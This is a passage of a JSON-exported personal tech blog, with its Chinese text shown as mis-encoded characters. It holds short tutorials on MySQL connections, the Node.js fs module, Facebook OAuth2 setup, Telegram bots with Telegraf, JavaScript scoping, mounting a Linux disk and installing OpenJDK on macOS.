GPL\n\nCopyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.\n\nOracle is a registered trademark of Oracle Corporation and/or its\naffiliates. Other names may be trademarks of their respective\nowners.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nmysql>\n```\n\nå¤§åŠŸå‘Šæˆï¼ğŸ˜„\n\n## å¾Œè¨˜\n\nä¹Ÿæœ‰å¦å¤–ä¸€ç¨®æ–¹å¼æ˜¯ä¸è¦ç”¨ localhost è€Œç”¨ 127.0.0.1\n\n`mysql -h 127.0.0.1 -u yiyu -p`\n\né€™æ¨£å­ä¹Ÿæœƒèµ° tcp é€£ç·š\n\nå°æ–¼ mysql ä¾†èªªï¼š\n\n- localhost\n- ç©ºç™½\n\nå°±æ˜¯ä½¿ç”¨ UNIX Domain Socket\n","tags":["docker","macos","mysql"]},{"title":"nodeJS ä¸­çš„ fs module ä»‹ç´¹","url":"/2019/05/19/","content":"\n## å‰è¨€\n\nåœ¨å­¸ç¿’ä»»ä½•ä¸€å€‹èªè¨€ä¸€å®šéƒ½æœƒé‡åˆ°æª”æ¡ˆè®€å¯«ï¼Œåœ¨ nodeJS ä¸­çš„æª”æ¡ˆè®€å¯«å¹¾ä¹éƒ½èƒ½é€é fs é€™å€‹ module ä¾†å®Œæˆã€‚\n\nè€Œä¸”åœ¨ [fs API](https://nodejs.org/api/fs.html) ä¸­æœ‰é€™éº¼ä¸€æ®µè©±\n\n`All file system operations have synchronous and asynchronous forms.`\n\nå°æ–¼é–‹ç™¼è€…ä¾†èªªå¯¦åœ¨æ˜¯éå¸¸æ£’ï¼Œä¸åƒæœ‰äº› module åŒæ­¥èˆ‡ç•°æ­¥æ˜¯åˆ†é–‹æˆå…©å€‹ä¸åŒçš„ moduleã€‚\n\n## å¸¸ç”¨æ“ä½œ\n\n### è®€å–æ–‡ä»¶\n\nä»¥ä¸‹è¦æ³¨æ„ç¬¬äºŒå€‹åƒæ•¸è¦æŒ‡å®šç·¨ç¢¼ï¼Œå¦å‰‡å°å‡ºä¾†æœƒæ˜¯ raw data çš„å½¢å¼:\n```\n<Buffer 68 65 6c 6c 6f 2c 20 77 6f 72 6c 64 0a>\n```\n\n```javascript\nconst fs = require('fs')\n\n//asynchronous\nfs.readFile('./a.txt', 'utf8', (err, data) => {\n\tconsole.log(data)\n})\n//synchronous\nlet data = fs.readFileSync('./a.txt', 'utf8')\nconsole.log(data)\n```\n\n### å¯«å…¥æ–‡ä»¶\n\n#### writeFile\nå¯«å…¥æ–‡ä»¶æ™‚ï¼Œç¬¬ä¸€å€‹åƒæ•¸ç‚ºè·¯å¾‘ï¼Œç¬¬äºŒå€‹åƒæ•¸ç‚ºå¯«å…¥å­—ä¸²ï¼Œç¬¬ä¸‰å€‹åƒæ•¸ç‚ºç·¨ç¢¼(é è¨­ç‚º utf-8)\n```javascript\n//asynchronous\nfs.writeFile('./b.txt', 'hi', (err) => {\n\tif (err) throw err\n\tconsole.log('done.')\n}\n//synchronous\nfs.writeFileSync('./b.txt', 'hi')\n```\n\n#### appendFile\nè‹¥ç„¡æ­¤æª”æ¡ˆï¼Œæœƒè‡ªå‹•å»ºç«‹ï¼Œè‹¥æœ‰ï¼Œå‰‡é™„åŠ è‡³å°¾ç«¯\n(ç¬¬ä¸€å€‹åƒæ•¸ç‚ºè·¯å¾‘ï¼Œç¬¬äºŒå€‹åƒæ•¸ç‚ºå¯«å…¥å­—ä¸²ï¼Œç¬¬ä¸‰å€‹åƒæ•¸ç‚ºç·¨ç¢¼(é è¨­ç‚º utf-8))\n```javascript\nfs.appendFile('./c.txt', 'append txt', (err) => {\n\tif (err) throw err\n\tconsole.log('done.')\n})\n//åŒæ¨£ä¹Ÿæœ‰ writeFileSync\ntry {\n\tfs.appendFileSync('message.txt', 'data to append');\n\tconsole.log('The \"data to append\" was appended to file!');\n} catch (err) {\n\t/* Handle the error */\n}\n```\n\n### é–‹æª”æ¡ˆ\n\nä»¥ä¸Š API ç¬¬ä¸€åƒæ•¸ä¹Ÿå¯ä»¥æ”¾ fdï¼Œç”¨ open å¯ä»¥è¨­å®šè©³ç´°æ¬Šé™ä¸¦ä¸”å›å‚³ fdã€‚\n\n```javascript\nfs.open('./a.txt', 'r',(err, fd) => {\n\tif (err) throw err\n\tfs.readFile(fd, 'utf-8', (err, data) => {\n\t\tif (err) throw err\n\t\tconsole.log(data)\n\t})\n})\n//fs.open ä¹Ÿä¸€æ¨£æœ‰åŒæ­¥ç‰ˆæœ¬ï¼Œåœ¨æ­¤ä¸è´…è¿°\n```\n\n### åˆªæª”æ¡ˆ\n\n```javascript\nfs.unlink('a.txt', (err) => {\n\tif (err) throw err\n\tconsole.log('deleted.')\n})\n//fs.unlink ä¹Ÿä¸€æ¨£æœ‰åŒæ­¥ç‰ˆæœ¬ï¼Œåœ¨æ­¤ä¸è´…è¿°\n```","tags":["nodejs"]},{"title":"å¯¦ä½œ facebook OAuth2 ç™»å…¥æ©Ÿåˆ¶","url":"/2019/05/19/","content":"\n## å‰è¨€\n\nå‰å¹¾é€±çœ‹åˆ° [developer-roadmap](https://github.com/kamranahmedse/developer-roadmap) ä¸­çš„å¾Œç«¯èƒ½åŠ›æŠ€èƒ½æ¨¹ï¼Œçœ‹åˆ°äº† OAuth2 é€™å€‹è½éå¤šæ¬¡ä½†æ˜¯æ²’æœ‰å¯¦éš›å¯¦ä½œéçš„é©—è­‰æ©Ÿåˆ¶ã€‚æ–¼æ˜¯é–‹å•Ÿäº†è‡ªå·±å¯¦ä½œçš„æƒ³æ³•ã€‚\n\nå®Œæ•´çš„åšæ³•æ”¾åœ¨ [oAuth-fb-tutorial](https://github.com/yiyu0x/oAuth2-fb-tutorial) ä¸­ï¼Œä»¥ä¸‹ç´€éŒ„äº†å¦‚ä½•é…ç½®ä»¥åŠç”³è«‹ tokenã€‚\n\n## setup\n\n0. é¦–å…ˆï¼Œå…ˆåœ¨ [facebook for developers](https://developers.facebook.com/) è¨»å†Šæ‡‰ç”¨ç¨‹å¼\n\n1. åœ¨æ­¤å°ˆæ¡ˆç›®éŒ„ä¸‹å»ºç«‹ .env, ä¸¦ä¸”å°‡ä½ çš„è³‡æ–™å¡«å…¥\n\n```\nfacebook_client_id=\nfacebook_secret_id=\nredirect_uri=\nfacebook_console_id=\n```\n\n`facebook_client_id` ä»¥åŠ `facebook_secret_id` åœ¨è¨»å†Šå®Œçš„æ‡‰ç”¨ç¨‹å¼è¨­å®šä¸­å¯ä»¥æ‰¾åˆ°\n\n<!-- {% asset_img fb-dev.png %} -->\n![1](fb-dev.png)\n\nåˆ†åˆ¥ç‚º `æ‡‰ç”¨ç¨‹å¼ç·¨è™Ÿ` ä»¥åŠ `æ‡‰ç”¨ç¨‹å¼å¯†é‘°`\n\n`redirect_uri` å‰‡å¡«å…¥ ip:3000/facebook/callback ï¼Œé€™é‚Šè¦æ³¨æ„çš„æ˜¯è‡‰æ›¸ä¸å…è¨±ç”¨ httpï¼Œæ‰€ä»¥ç„¡æ³•åªæ¥ç”¨ localhostï¼Œ é€™é‚Šæ¨è–¦å¤§å®¶ç”¨ [ngrok](https://ngrok.com/) ä¾†å°‡ä¸€å€‹å¤–ç¶²ç¶²å€æ˜ å°„åˆ° localhost:3000/callback/facebook\n\n<!-- {% asset_img ngrok.png %} -->\n![2](ngrok.png)\n\nä¾‹å¦‚æˆ‘çš„ ngrok å¹«æˆ‘æ˜ å°„çš„ URL ç‚º https://7bfbb3ed.ngrok.io\n\nå‰‡ `redirect_uri` å°±å¡«å…¥ `https://7bfbb3ed.ngrok.io/facebook/callback`\n\né™¤äº†åœ¨ `.env` å¡«å…¥ä»¥å¤–ï¼Œ ä¹Ÿè¦è¨˜å¾—åœ¨å‰›æ‰æ‡‰ç”¨ç¨‹å¼è¨­å®šä¸­å¡«å…¥ `æœ‰æ•ˆçš„ OAuth é‡æ–°å°å‘ URI` ä¹‹ä¸­\n\n<!-- {% asset_img fb-dev2.png %} -->\n![3](fb-dev2.png)\n\næœ€å¾Œä¸€å€‹ `facebook_console_id` å‰‡æ˜¯è‡ªå·±çš„ facebook å¸³æˆ¶ token\n\nå–å¾—æ–¹å¼ç‚º:\n\n`curl -X GET \"https://graph.facebook.com/oauth/access_token?client_id={id}&client_secret={id}&grant_type=client_credentials\"`\n\n`client_id` èˆ‡ `client_secret` èˆ‡ .env çš„å‰å…©å€‹æ¬„ä½ç›¸åŒ\n\n2. `npm i`\n   (å®‰è£æ‰€éœ€å¥—ä»¶)\n\n3. `npm run server`\n   (æ­¤æ™‚ç€è¦½ localhost:3000 å³å¯)\n\n## demo\n\n<!-- {% asset_img demo.png %} -->\n![4](demo.png)\n","tags":["oauth2"]},{"title":"telegram-bot API æ‡¶äººåŒ…","url":"/2019/05/06/","content":"\n## å‰è¨€\né€™å¹¾å¤©æ¥è§¸äº† telegram APIï¼Œç”¨ä¾†ä¸²ä¸€äº›é–“å–®çš„ç¨‹å¼ä¸¦ä¸”å°‡çµæœç™¼é€çµ¦è‡ªå·±ï¼Œä¸€é–‹å§‹ç”¨çš„æ˜¯ [node-telegram-bot-api](https://github.com/yagop/node-telegram-bot-api) ï¼Œä½†æ˜¨å¤©ç™¼ç¾è£¡é ­æœ‰äº› event è¨­è¨ˆä¼¼ä¹ä¸æ˜¯é€™éº¼ç›´è¦ºã€‚\n\nç•¶åˆæœƒé¸æ“‡ node-telegram-bot-api æ˜¯å› ç‚ºå®ƒåœ¨ github ä¸Šçš„ star æ¯”è¼ƒå¤šã€‚å¾Œä¾†ä¾ç…§å®˜æ–¹çš„æ¨è–¦é †åºï¼Œé¸æ“‡äº† [telegraf](https://telegraf.js.org/#/?id=telegraf)ã€‚\n\nä»¥ä¸‹ä»‹ç´¹åŸºæœ¬å¸¸ç”¨çš„åŠŸèƒ½ï¼Œä»¥åŠè‡ªå·±çš„å°ç­†è¨˜ ğŸ˜Š\n\n## èµ·æ‰‹å¼\n\n### å‰ç½®ä½œæ¥­\n\n```javascript=\nrequire('dotenv').config();\nconst Telegraf = require('telegraf')\nconst bot = new Telegraf(process.env.BOT_TOKEN)\n\nbot.launch()//æ²’æœ‰é€™è¡Œçš„è©±ï¼Œç›£è½äº‹ä»¶éƒ½æœƒè½ä¸åˆ°å…§å®¹ã€‚ä½†æ˜¯é‚„æ˜¯å¯ä»¥ä¸»å‹•ç™¼é€è¨Šæ¯ï¼Œé€™è¡Œè¦åŠ åœ¨ç¨‹å¼å°¾ç«¯\n```\n\n### å¸¸ç”¨åŠŸèƒ½\n\n```javascript=\nbot.start((ctx) => ctx.reply('Welcome')) //é»æ“Š start å€å¡Šå¾Œçš„è¡Œç‚º\n\nbot.help((ctx) => ctx.reply('Send me a sticker')) //è¼¸å…¥ /help å¾Œçš„è¡Œç‚º\n\nbot.on('sticker', (ctx) => ctx.reply('ğŸ‘')) //æ”¶åˆ°è²¼åœ–çš„è¡Œç‚º\n//ä¹Ÿå¯ä»¥å°‡ sticker æ›æˆ text ç­‰ç­‰ä¸åŒäº‹ä»¶\n\nbot.hears('hi', (ctx) => ctx.reply('Hey there')) //æ”¶åˆ°æŸæ®µæ–‡å­—å¾Œçš„è¡Œç‚º\n```\n\n## è§£ææ”¶åˆ°çš„è¨Šæ¯\n\n### å–å¾—ç”¨æˆ¶è³‡è¨Š\n\nå¦‚æœ bot è¦ä¸»å‹•ç™¼é€è¨Šæ¯çµ¦æŸå€‹ç”¨æˆ¶ï¼Œéœ€è¦çŸ¥é“æŸå€‹ç”¨æˆ¶çš„ userID (group çš„è©±å°±è¦çŸ¥é“ groupID)ã€‚\n\næˆ‘å€‘å¯ä»¥é€éè§£æè¨Šæ¯ä¾†å¾—çŸ¥ç™¼é€æ–¹çš„è³‡è¨Š(ä¹Ÿèƒ½é€é http API ä»‹é¢)ï¼š\n```javascript=\nbot.on('message', ({ from: { username, first_name, last_name, id }, reply }) => {\n    let name = first_name + last_name\n    let log = `${name} (${id})`\n    console.log(log)\n    //or\n    console.log(ctx.message.from.id) // user_id\n\tconsole.log(ctx.message.text)    // user_text\n})\n```\n\n### å–å¾—åª’é«” id\n\nä»¥åœ–ç‰‡ç‚ºä¾‹ï¼Œå–å¾—åª’é«” idã€‚\n\né€™é‚Šæœ‰ä¸€å€‹å¾ˆé‡è¦çš„è§€å¿µï¼Œ photo äº‹ä»¶ä¹Ÿæ˜¯ message äº‹ä»¶çš„ä¸€ç¨®ï¼Œæ‰€ä»¥åœ¨ç›£è½çš„æ™‚å€™å¦‚æœæœ‰ä»¥ä¸‹ï¼š\n```javascript=\nbot.on('message', () => {})\n```\nä¹Ÿå­˜åœ¨æ–¼ç¨‹å¼ä¸­ï¼Œé‚£éº¼ï¼š\n\n```javascript=\nbot.on('photo', (ctx) => {\n    let file_id = ctx['update']['message']['photo'][0]['file_id']\n    console.log(file_id)\n    //or\n    console.log(ctx.message.photo[0].file_id)\n})\n```\n\nå¾ˆå¯èƒ½æœƒè¢«ç¬¬ä¸€å€‹ç›£è½äº‹ä»¶ï¼Œæå‰æ¶èµ°ï¼Œé€ æˆæ²’ç›£è½åˆ°äº‹ä»¶ã€‚\n\n## ä¸»å‹•ç™¼é€è¨Šæ¯\n\n```javascript=\nbot.telegram.sendMessage(process.env.yiyuUID, 'hello, yiyu')\n\nbot.telegram.sendPhoto(process.env.yiyuUID, PHOTO)\n// é€™é‚Šçš„ PHOTO å¯ä»¥æ˜¯ image-url æˆ–æ˜¯ file_id (å¦‚æœé€™å¼µåœ–å·²ç¶“åœ¨ telegram server ä¸Šçš„è©±)\n```\n\n## å°åœ°é›·\n\nå¦‚ä¸Šè¿°ï¼Œ message äº‹ä»¶å¾ˆå®¹æ˜“æŠŠåˆ¥äººçš„ç›£è½æ¶èµ°ï¼Œå› ç‚º message æ˜¯å°äº‹ä»¶çš„é›†åˆã€‚æ‰€ä»¥ç•¶è¦é‡å°ç´”åœ–ç‰‡åšè™•ç†çš„æ™‚å€™ï¼Œå¯ä»¥æŠŠ message æ›æˆ textã€‚\n```javascript=\nbot.on('text', (ctx) => {\n    ctx.reply('received')\n})\n```\nç”¨æ„åœ¨æ–¼ï¼Œè®“ç´”æ–‡å­—èˆ‡ç´”åœ–ç‰‡å„è‡ªæœ‰è‡ªå·±çš„ç›£è½ç¯„åœï¼Œå½¼æ­¤ä¸å¹²æ“¾ã€‚\n\nä½†æ˜¯å¦‚æœè¦è™•ç†ï¼Œ`åœ–ç‰‡ + æ–‡å­—` é€™ç¨®è¨Šæ¯çš„è©±ï¼Œé‚„æ˜¯éœ€è¦ç›£è½ message è¼ƒé©åˆã€‚\n\n## ä¾‹å¤–è™•ç†\n\n```javascript=\nbot.catch((err) => {\n  console.log('Ooops', err)\n})\n```","tags":["telegram"]},{"title":"äº†è§£nodeJSä¸­çš„this","url":"/2019/03/29/","content":"\n## \"This\" in nodeJS\n\nä»¥ä¸‹è¨è«– nodeJS ä¸­çš„ thisï¼Œèˆ‡ javascript ä¸­çš„ this ä¸åŒï¼Œè«‹ä¸è¦ææ··äº†ã€‚\n\n## function å¤–çš„ this\n\nfunction å¤–çš„ this æŒ‡å‘ `module.exports`\n\n```javascript=\nconsole.log('outside: ', this) // {}\n```\n\n```javascript=\nmodule.exports.bar = 3\nconsole.log('outside: ', this) // outside:  { bar: 3 }\n```\n\nåˆ‡è¨˜ï¼é€™å€‹ this ä¸¦ä¸æ˜¯ `global`\n\n## function ä¸­çš„ this\n\nfunction ä¸­çš„ this æ‰æ˜¯æŒ‡å‘ global\n```javascript=\nfunction foo(argument) {\n\tconsole.log(this)\n}\nfoo()\n```\noutput:\n```\nObject [global] {\n  DTRACE_NET_SERVER_CONNECTION: [Function],\n  DTRACE_NET_STREAM_END: [Function],\n  DTRACE_HTTP_SERVER_REQUEST: [Function],\n  DTRACE_HTTP_SERVER_RESPONSE: [Function],\n  DTRACE_HTTP_CLIENT_REQUEST: [Function],\n  DTRACE_HTTP_CLIENT_RESPONSE: [Function],\n  global: [Circular],\n  process:\n   process {\n     title: 'node',\n     version: 'v10.14.1',\n     versions:\n      { http_parser: '2.8.0',\n        node: '10.14.1',\n        v8: '6.8.275.32-node.36',\n        ...\n        ...\n        ...\n```\n\nå¦‚æœæˆ‘å€‘ç¢ºå®š function ä¸­çš„ this æŒ‡å‘ globalï¼Œé‚£éº¼å¯ä»¥é€éä»¥ä¸‹ä¾‹å­åœ¨ global æ–°å¢å±¬æ€§\n\n```javascript=\nfunction foo(argument) {\n\tthis.apple = 'A big apple'\n}\nfoo()\nconsole.log(global.apple) //A big apple\n```\n\n## ç‰©ä»¶ä¸­çš„ this\n\nå†ä¾†ï¼Œæˆ‘å€‘è¦è¨è«–ç‰©ä»¶ä¸­çš„ thisï¼Œé€™é‚Šå°±è·Ÿå…¶ä»–ç¨‹å¼èªè¨€è¼ƒç‚ºé¡ä¼¼ï¼Œç‰©ä»¶ä¸­çš„ this æŒ‡å‘ç‰©ä»¶æœ¬èº«ã€‚\n\n```javascript=\nclass Foo {\n\tconstructor() {\n\t\tconsole.log(this)\t\n\t}\n}\n\nfunction foo2() {\n\tconsole.log(this)\n}\n\nnew Foo() //Foo {}\nnew foo2() //foo2 {}\n```\n\n## arrow function ä¸­çš„ this\n\n```javascript=\nlet obj = {\n\tfoo() {\n\t\tconsole.log(this)\n\t},\n\tarr: () => console.log(this)\n\n\n}\n\nobj.foo() //{ foo: [Function: foo], arr: [Function: arr] }\nobj.arr() //{}\n```\n\nè¦æ³¨æ„çš„æ˜¯ arrow function ä¸æœƒæœ‰è‡ªå·±çš„ç©ºé–“ï¼Œå³ä½¿åœ¨ç‰©ä»¶ä¸­ä¹Ÿæ˜¯ã€‚\n\né€™é‚Š arrow function çš„ this æŒ‡å‘çš„æ˜¯ `module.exports` (ç›¸åŒæ–¼ function å¤–çš„ this)\n\n\n## ç‚ºä½•é€™éº¼è¤‡é›œï¼Ÿ\n\nç‚ºä»€éº¼ nodeJS çš„ this è¦é€™æ¨£è¨­è¨ˆï¼Ÿ\n\nå…¶å¯¦è·Ÿä½œç”¨åŸŸæœ‰é—œï¼Œåœ¨ nodeJS ä¸­ï¼Œæ¯ä¸€å€‹ä»½ js æª”æ¡ˆéƒ½æ˜¯ä¸€ä»½ moduleã€‚ç„¶è€Œé€™æ¨£çš„è¨­è¨ˆæœ‰åˆ©æ–¼å€éš”ä¸åŒ module ä¹‹é–“çš„å‘½åç©ºé–“ã€‚\n\n---\næˆ‘å€‘åœ¨ A æª”æ¡ˆä¸‹çš„ global å±¬æ€§ï¼Œåªè¦ B å¼•å…¥ A æ¨¡çµ„ï¼Œå°±å¯ä»¥ç›´æ¥ä½¿ç”¨ A æª”æ¡ˆçš„ global å±¬æ€§ã€‚\n\nA.js\n\n```javascript=\nglobal.bar = 3\nbar2 = 5 // ç›´æ¥å®£å‘Šå…¶å¯¦å°±æ˜¯åœ¨ global ä¹‹ä¸‹\nvar bar3 = 7 // ç”¨ var æ˜¯åœ¨å¦å¤–ä¸€å¡Šä½œç”¨åŸŸä¹‹ä¸­ï¼Œåªæœ‰è©²æª”æ¡ˆçœ‹å¾—åˆ°\n```\n\nB.js\n\n```javascript=\nrequire('./A')\nconsole.log(global.bar) //3\n//ç•¶ç„¶ æˆ‘å€‘ä¹Ÿå¯ä»¥é€™æ¨£ä½¿ç”¨ bar\nconsole.log(bar) //3\nconsole.log(bar2) //5\nconsole.log(bar3) //ReferenceError: bar3 is not defined\n```\n\nç”±ä»¥ä¸Šä¾‹å­åˆå¯ä»¥çŸ¥é“ï¼Œå…¶å¯¦æˆ‘å€‘åŸæœ¬ç›´æ¥ä½¿ç”¨çš„é‚£äº› functionï¼Œé€šé€šéƒ½åœ¨ global ä¹‹ä¸­\n\n```javascript=\nconsole.log(global.console.log === console.log) // true\n```\n","tags":["javascript","es6"]},{"title":"äº†è§£javesvriptä¸­çš„var","url":"/2019/03/25/","content":"\nè¨˜éŒ„å¹¾å€‹æœˆå‰å¹«åŠ©åŒå­¸é‡åˆ°çš„ä¸€å€‹å•é¡Œï¼ŒåŒæ™‚äº†è§£èƒŒå¾Œçš„åŸç†ã€‚\n\n```javascript\nfor (var i = 0; i < 5; i++) {\n\tsetTimeout(() => {\n\t\tconsole.log(i)\n\t}, 0)\n}\n```\noutput:\n> 5 5 5 5 5\n\nå¾ˆå¤šäººæœƒèªç‚º output æ‡‰è©²ç‚º `0 1 2 3 4` \n\nè¦è¨˜å¾— callback function æœƒè¢«ä¸Ÿåˆ° callback queue ç­‰åˆ° thread æœ‰ç©ºæ‰å»åŸ·è¡Œï¼Œæ‰€ä»¥ä¸€å…±æœ‰ 5 å€‹ callback function æº–å‚™è¦å°å‡º `console.log(i)`ã€‚\n\nç„¶è€Œ i æœƒå› ç‚ºè®Šæˆ 5 è€Œé›¢é–‹è¿´åœˆï¼Œæ­¤æ™‚ main thread å·²æ²’æœ‰ä»»å‹™å¯ä»¥åŸ·è¡Œï¼Œæ‰€ä»¥åŸ·è¡Œ callback queue ä¸­çš„ 5 å€‹ `console.log(i)`ï¼Œé€™ä¹Ÿæ˜¯ç‚ºä½• i çš„å€¼ç‚º 5ã€‚\n\n## è§£æ³•\n\n### 1. let å–ä»£ var\n\n```javascript\nfor (let i = 0; i < 5; i++) {\n\tsetTimeout(() => {\n\t\tconsole.log(i)\n\t}, 0)\n}\n```\næœ€é–“å–®çš„è§£æ³•å°±æ˜¯ç”¨ let å–ä»£ varï¼Œlet æœƒå°‡è®Šæ•¸çš„ scope é–å®šè‡³ block ä¹‹ä¸­ã€‚ä¹Ÿå°± 5 å€‹ `console.log` éƒ½åˆ†åˆ¥æ“æœ‰è‡ªå·±çš„ i è®Šæ•¸ï¼Œä¸¦ä¸”ç”Ÿå‘½é€±æœŸåªåˆ°è¿´åœˆçµæŸã€‚\n\n### 2. IIFE\n\n```javascript\nfor (var i = 0; i < 5; i++) {\n\t(function (num) {\n\t\tsetTimeout(() => {\n\t\t\tconsole.log(num)\n\t\t}, 0)\n\t})(i)\n}\n```\nlet é—œéµå­—æ˜¯ es6 çš„æ–°ç‰¹æ€§ï¼Œæ²’æœ‰ es6 çš„æ™‚ä»£å¯ä»¥ç”¨ IIFE ä¾†è§£æ±ºã€‚IIFE ç‚ºä¸€å€‹ç«‹å³åŸ·è¡Œçš„ functionï¼Œæˆ‘å€‘å¯ä»¥æŠŠ i ä¸Ÿåˆ°ä¸€å€‹æ–°çš„ function ä¸­å»åŸ·è¡Œï¼Œé€™æ¨£åšçš„åŸå› æ˜¯å› ç‚º function æ“æœ‰è‡ªå·±ç¨ç«‹çš„ scope ï¼Œå¦‚æ­¤ä¸€ä¾†å°±å¯ä»¥è·Ÿå¤–ç•Œçš„ i å€éš”ã€‚\n\n","tags":["javascript","es6"]},{"title":"å¦‚ä½•åœ¨Linuxä¸Šæ›è¼‰å¤–æ¥ç¡¬ç¢Ÿ","url":"/2019/03/19/","content":"\n## å‰è¨€\n\næœ€è¿‘åœ¨ç·´ç¿’ `quota` ç”¨ä¾†é…ç½®æ¯ä¸€å€‹ä½¿ç”¨è€…çš„ç›®éŒ„ç”¨é‡ï¼Œ `quota` æ˜¯ä»¥åˆ†å‰²å€ç‚ºå–®ä½ï¼Œç™¼ç¾è‡ªå·±é€£ç¡¬ç¢Ÿæ›è¼‰éƒ½ä¸å¤ªç†Ÿæ‚‰ï¼Œå¯ä»¥æ˜¯å¹³å¸¸éƒ½ç”¨é ç«¯æ©Ÿå™¨çš„ç·£æ•…ï¼Œè¼ƒå°‘æ›è¼‰ç¶“é©—ï¼Œæ­¤ç¯‡æ–‡ç« è¨˜éŒ„ä¸€ä¸‹æ›è¼‰éç¨‹ã€‚\n\n## æ¥ä¸Šç¡¬ç¢Ÿ\n\nç„¡è«–æ˜¯å¯¦é«”ç¡¬ç¢Ÿï¼Œè™›æ“¬ç¡¬ç¢Ÿï¼Œæ¥ä¸Šå¾Œç¬¬ä¸€æ­¥æ‡‰è©²ç¢ºèªæ˜¯å¦æˆåŠŸè®€å–\n\n`ls /dev/sd*`\n\n## åˆ†å‰²\n\nç¢ºèªè®€å–ä¹‹å¾Œï¼Œå…ˆç”¨ fdisk ç¢ºèªç¡¬ç¢Ÿæ˜¯å¦æ­£ç¢º\n`fdisk -l /dev/sdb`\n\nä½¿ç”¨ fdisk åˆ†å‰²ç¡¬ç¢Ÿ\n`fdisk /dev/sdb`\n\né€²å…¥ fdisk ç¨‹å¼å¾Œï¼Œä½¿ç”¨ `m` ä¾†æŸ¥çœ‹æŒ‡ä»¤ï¼Œä¸¦ä¸”ç”¨ `n` æ–°å¢åˆ†å‰²å€ï¼Œä¾æç¤ºå®Œæˆåˆ†å‰² (åˆ†å‰²å®Œç•¢è¨˜å¾—ç”¨ `w` å¯«å…¥åˆ†å‰²è¡¨)\n\né‡æ–°ç¢ºèªæ˜¯å¦æœ‰åˆ†å‰²è¡¨å‡ºç¾\n \n`fdisk -l /dev/sdb`\n\n## æ ¼å¼åŒ–\n\nå¦‚æœæƒ³è¦æ ¼å¼åŒ–æˆ ext4\n\n`mkfs -t ext4 /dev/sdb`\n\nå¦‚æœæƒ³è¦æ ¼å¼åŒ–æˆ xfs (å› çˆ² `-t` æœƒå‡ºç¾å•é¡Œï¼Œæ‰€ä»¥åŠ ä¸Šåƒæ•¸ `-f` ä¾†å¼·åˆ¶æ ¼å¼åŒ–)\n\n`mkfs.xfs -f /dev/sdb`\n\n## æ›è¼‰\n\næ›è¼‰ä¹‹å‰ï¼Œè¦å°‡ç¡¬ç¢Ÿè³‡è¨Šå¯«å…¥åœ¨ `/etc/fstab`\n\nè¨­å®šæª”éœ€è¦ UUID è³‡è¨Šï¼Œå¯ä»¥é€é `blkid` å¾—çŸ¥ (æˆ‘çš„ sdb UUID ç‚º f6229601-6fae-4033-9e84-ee0815c9d725)\n\nä¹‹å¾Œåœ¨ /etc/fstab å°¾ç«¯åŠ ä¸Š\n\n/etc/fstab:\n```\nUUID=f6229601-6fae-4033-9e84-ee0815c9d725 /DISK2  xfs   defaults,usrquota,grpquota        0 0\n```\n\n`/DISK2` ç‚ºæˆ‘å€‘è¦æ›è¼‰çš„ç›®éŒ„ï¼Œå¾Œé¢ç‚ºæª”æ¡ˆç³»çµ±ï¼Œå¦‚æœè¦ç”¨ quota ç®¡ç†ç›®éŒ„ï¼Œå¯ä»¥åŠ ä¸Š `usrquota,grpquota`\n\nä¹‹å¾Œè¨˜å¾—è¦å‰µå»ºæˆ‘å€‘éœ€è¦æ›è¼‰çš„ç›®éŒ„ï¼Œä¸¦ä¸”æ›è¼‰å®ƒ\n\n`mkdir /DISK2`\n\n`mount /DISK2`\n\nå¯ä»¥ç”¨ `df` æŸ¥çœ‹æ˜¯å¦æ›è¼‰æˆåŠŸ","tags":["Linux"]},{"title":"å¦‚ä½•åœ¨ macOS ä¸Šè‡ªè¡Œå®‰è£ openJDK","url":"/2019/03/10/","content":"\nåœ¨åŸ·è¡Œ ghidra çš„æ™‚å€™ï¼Œè·³å‡ºä¸€æ¢éŒ¯èª¤è¨Šæ¯\n\n`JDK 11+ could not be found and must be manually chosen!`\n\nä½†æ˜¯å» oracle java çš„ç¶²ç«™ä¸Šåªæœ‰çœ‹åˆ°ç¬¬å…«ç‰ˆçš„ JDK\n\næ–¼æ˜¯æ‰¾åˆ°äº† openJDKï¼Œä»¥ä¸‹ç´€éŒ„å¦‚ä½•ä½¿ç”¨ openJDK æ›¿æ›ç›®å‰çš„ jave ç’°å¢ƒ\n\nè«‹è‡³ [jdk.java.net](https://jdk.java.net/11/) ä¸‹è¼‰ JDK11\n\nä¸‹è¼‰å®Œæª”æ¡ˆåç¨±ç‚º `openjdk-11.0.2_osx-x64_bin.tar.gz` (å¯ä»¥æ›¿æ›æˆè‡ªå·±ä¸‹è¼‰çš„ç‰ˆæœ¬)\n\n`cd ~/Downloads`\n`tar xf openjdk-11.0.2_osx-x64_bin.tar.gz`\n(é †ä¾¿æ¨è–¦ zshï¼Œåªè¦ä¸‹ `x` æŒ‡ä»¤å°±èƒ½è‡ªå‹•è§£å£“ç¸®)\n\næ¬ç§»æª”æ¡ˆè‡³ JVM\n`sudo mv jdk-11.0.2.jdk /Library/Java/JavaVirtualMachines/`\n\næª¢æŸ¥æ˜¯å¦å·²ç¶“æ›¿æ›æ–°çš„ JAVA ç’°å¢ƒ\n\n```\n$ java -version\nopenjdk version \"11.0.2\" 2019-01-15\nOpenJDK Runtime Environment 18.9 (build 11.0.2+9)\nOpenJDK 64-Bit Server VM 18.9 (build 11.0.2+9, mixed mode)\n```\n\n```\n$ javac -version\njavac 11.0.2\n```\n\n","tags":["macos"]},{"title":"Lineå°ç£ç¸½éƒ¨åƒè¨ªå¿ƒå¾—","url":"/2019/03/09/","content":"\n## TL;DR\n\nå‰å¤©èˆ‡å°ç§‘å¤§è³‡è¨Šå®‰å…¨ç¤¾çš„åŒå­¸å€‘ä¸€èµ·åƒè¨ªå°ç£ Line ç¸½éƒ¨ï¼Œé€™ç¯‡æ–‡ç« ç°¡å–®è¨˜éŒ„å¿ƒå¾—ã€‚\n\n## æ­£æ–‡\n\n{% asset_img line_01.JPG %}\n![1](line_01.JPG)\n\nå°ç£ Line ç¸½éƒ¨ä½æ–¼å°åŒ—å¸‚å…§æ¹–å€çš„è¾¦å…¬å¤§æ¨“å…§ï¼Œæ¥å¾…æˆ‘å€‘çš„æ˜¯ä¸€ä½è³‡è¨Šå®‰å…¨çš„å·¥ç¨‹å¸« Davidã€‚David è®“æˆ‘å€‘å…ˆæ­é›»æ¢¯å»è¾¦å…¬å¤§æ¨“å…§çš„ 10 æ¨“ç­‰å¾…ï¼Œé€”ä¸­å‰›å¥½åœ¨ 4 æ¨“é–€å°±æ‰“é–‹äº†ï¼Œæ˜ 